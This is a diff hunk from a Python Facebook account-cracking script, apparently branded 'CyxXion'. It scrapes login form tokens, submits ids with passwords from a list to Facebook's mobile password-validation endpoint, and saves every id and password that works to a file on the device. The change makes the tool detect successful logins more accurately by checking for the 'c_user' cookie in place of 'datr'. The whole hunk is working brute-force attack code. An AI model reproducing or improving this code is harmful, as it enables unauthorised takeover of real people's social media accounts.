@@ -238,7 +238,7 @@ def m1(ids,names,passlist):
                         idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post(f'https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                         CyxXion=session.cookies.get_dict().keys()
-                        if "datr" in CyxXion:
+                        if "c_user" in CyxXion:
                                   print(f'\r\r\033[1;32m[ CyxXion\033[1;36m-\033[1;37m\033[1;32mOK ] %s \033[1;36m|\033[1;37m\033[1;32m %s'%(ids,pas))
                                   os.popen('play-audio data/ok.mp3')
                                   open(f'/sdcard/CyxXion-OK.txt', 'a').write(ids+'|'+pas+'\n')
